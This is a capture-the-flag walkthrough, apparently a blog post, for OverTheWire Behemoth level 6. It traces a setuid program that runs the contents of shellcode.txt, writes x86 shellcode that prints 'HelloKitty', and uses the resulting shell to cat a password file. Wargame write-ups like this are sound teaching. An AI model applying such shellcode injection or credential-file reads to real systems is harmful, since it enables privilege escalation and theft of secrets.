---
layout: post
title: OverTheWire - Behemoth 6
---

Site: http://overthewire.org/wargames/behemoth/ <br>
Level: 6<br>
Situation: Custom Shellcode Exercise?<br><br>

This challenge had potential to be multistage and I’ll be a bit challenging. However it was much simpler then it first appeared.

We start in the usual fashion. Create our working directory, find the file arch type, run the application.

{% highlight bash %}
behemoth6@melinda:~$ mkdir /tmp/bh6
behemoth6@melinda:~$ cd /tmp/bh6
behemoth6@melinda:/tmp/bh6$ 
{% endhighlight %}

{% highlight bash %}
behemoth6@melinda:/tmp/bh6$ file /behemoth/behemoth6
/behemoth/behemoth6: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=86bc5c0766b602cb1d1e85955eca6360ae5b5ac6, not stripped
{% endhighlight %}

{% highlight bash %}
behemoth6@melinda:/tmp/bh6$ /behemoth/behemoth6
Incorrect output.
{% endhighlight %}

So far nothing to interesting lets go ahead and ltrace the application.

{% highlight bash %}
behemoth6@melinda:/tmp/bh6$ ltrace /behemoth/behemoth6
__libc_start_main(0x804857d, 1, 0xffffd784, 0x8048660 <unfinished ...>
popen("/behemoth/behemoth6_reader", "r")           = 0x804b008
malloc(10)                                         = 0x804b0b8
fread(0x804b0b8, 10, 1, 0x804b008)                 = 1
pclose(0x804b008 <no return ...>
--- SIGCHLD (Child exited) ---
<... pclose resumed> )                             = 0
strcmp("Couldn't o", "HelloKitty")                 = -1
puts("Incorrect output."Incorrect output.
)                          = 18
+++ exited (status 0) +++
{% endhighlight %}

We see two things here.

1. Another application has been opened using popen. "behemoth6_reader"

2. It is getting the return value and using it in a strcmp to "HelloKitty".

Now let’s go ahead and run a file and ltrace on the behemoth6_reader.

{% highlight bash %}
behemoth6@melinda:/tmp/bh6$ file /behemoth/behemoth6
/behemoth/behemoth6: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=86bc5c0766b602cb1d1e85955eca6360ae5b5ac6, not stripped
{% endhighlight %}

{% highlight bash %}
behemoth6@melinda:/tmp/bh6$ ltrace /behemoth/behemoth6_reader
__libc_start_main(0x80485ad, 1, 0xffffd774, 0x80486c0 <unfinished ...>
fopen("shellcode.txt", "r")                        = 0
puts("Couldn't open shellcode.txt!"Couldn't open shellcode.txt!
)               = 29
+++ exited (status 0) +++
{% endhighlight %}
 
It is attempting to open a text file called shellcode.txt. Let’s go ahead and create this file and see what is returned.

{% highlight bash %}
behemoth6@melinda:/tmp/bh6$ ltrace /behemoth/behemoth6_reader
__libc_start_main(0x80485ad, 1, 0xffffd774, 0x80486c0 <unfinished ...>
fopen("shellcode.txt", "r")                        = 0x804b008
fseek(0x804b008, 0, 2, 0x8048712)                  = 0
ftell(0x804b008, 0, 2, 0x8048712)                  = 0
rewind(0x804b008, 0, 2, 0x8048712)                 = 0xfbad2488
malloc(0)                                          = 0x804b170
fread(0x804b170, 0, 1, 0x804b008)                  = 0
fclose(0x804b008)                                  = 0
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
{% endhighlight %}

The file is opened and read however a segfault occurs. So we open it up in GDB to see what is going on.

{% highlight bash %}
(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
-- SNIP --
   0x08048672 <+197>:	movzx  eax,BYTE PTR [eax]
   0x08048675 <+200>:	cmp    al,0xb
   0x08048677 <+202>:	jne    0x8048691 <main+228>
   0x08048679 <+204>:	mov    DWORD PTR [esp],0x804877d
   0x08048680 <+211>:	call   0x8048450 <puts@plt>
   0x08048685 <+216>:	mov    DWORD PTR [esp],0x1
   0x0804868c <+223>:	call   0x8048470 <exit@plt>
   0x08048691 <+228>:	add    DWORD PTR [esp+0x1c],0x1
   0x08048696 <+233>:	mov    eax,DWORD PTR [esp+0x1c]
   0x0804869a <+237>:	cmp    eax,DWORD PTR [esp+0x24]
   0x0804869e <+241>:	jl     0x8048668 <main+187>
   0x080486a0 <+243>:	mov    eax,DWORD PTR [esp+0x28]
   0x080486a4 <+247>:	mov    DWORD PTR [esp+0x2c],eax
   0x080486a8 <+251>:	mov    eax,DWORD PTR [esp+0x2c]
   0x080486ac <+255>:	call   eax
   0x080486ae <+257>:	mov    eax,0x0
   0x080486b3 <+262>:	leave  
   0x080486b4 <+263>:	ret    
End of assembler dump.
-- SNIP --
{% endhighlight %}

After disassembly we can see that in fact our file is loaded into memory. More interestingly is the call to EAX. We break here and see what is being called. We add "aaa" to our shellcode.txt to see if it is called and create a breakpoint on the call EAX address.

{% highlight bash %}
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /games/behemoth/behemoth6_reader 

Breakpoint 3, 0x080486ac in main ()
(gdb) x/s $eax
0x804b170:	"aaa\n"
{% endhighlight %}

As we thought would happen, it is calling EAX code directly. To get the output we need we will write some shell code that returns the string "HelloKitty".

{% highlight asm %}
;HelloKitty.asm
[SECTION .text]

global _start

_start:

        jmp short ender

        starter:

        xor eax, eax    ;clean up the registers
        xor ebx, ebx
        xor edx, edx
        xor ecx, ecx

        mov al, 4       ;syscall write
        mov bl, 1       ;stdout is 1
        pop ecx         ;get the address of the string from the stack
        mov dl, 10       ;length of the string
        int 0x80

        xor eax, eax
        mov al, 1       ;exit the shellcode
        xor ebx,ebx
        int 0x80

        ender:
        call starter	;put the address of the string on the stack
        db 'HelloKitty'

{% endhighlight %}

We need to compile this and link for i386. 

{% highlight bash %}
behemoth6@melinda:/tmp/bh6$ nasm -f elf32 HelloKitty.asm 
behemoth6@melinda:/tmp/bh6$ ld -m elf_i386 -s -o HelloKitty HelloKitty.o
{% endhighlight %}

To get the shell code we simply use objdump and manually copy out the values.

{% highlight bash %}
behemoth6@melinda:/tmp/bh6$ objdump -d HelloKitty

HelloKitty:     file format elf32-i386


Disassembly of section .text:

08048060 <.text>:
-- SNIP --
 8048060:	eb 19                	jmp    0x804807b
 8048062:	31 c0                	xor    %eax,%eax
 8048064:	31 db                	xor    %ebx,%ebx
 8048066:	31 d2                	xor    %edx,%edx
 8048068:	31 c9                	xor    %ecx,%ecx
 804806a:	b0 04                	mov    $0x4,%al
 804806c:	b3 01                	mov    $0x1,%bl
 804806e:	59                   	pop    %ecx
 804806f:	b2 0a                	mov    $0xa,%dl
 8048071:	cd 80                	int    $0x80
-- SNIP --
{% endhighlight %}

After some modifying our shellcode is as follows.

{% highlight bash %}
\xeb\x19\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x04\xb3\x01\x59\xb2\x0a\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x48\x65\x6c\x6c\x6f\x4b\x69\x74\x74\x79
{% endhighlight %}

Now we insert that into shellcode.txt and we get the following.

{% highlight bash %}
behemoth6@melinda:/tmp/bh6$ /behemoth/behemoth6
Correct.
$ cat /etc/behemoth_pass/behemoth7
[OMITTED]
{% endhighlight %}

There is our password.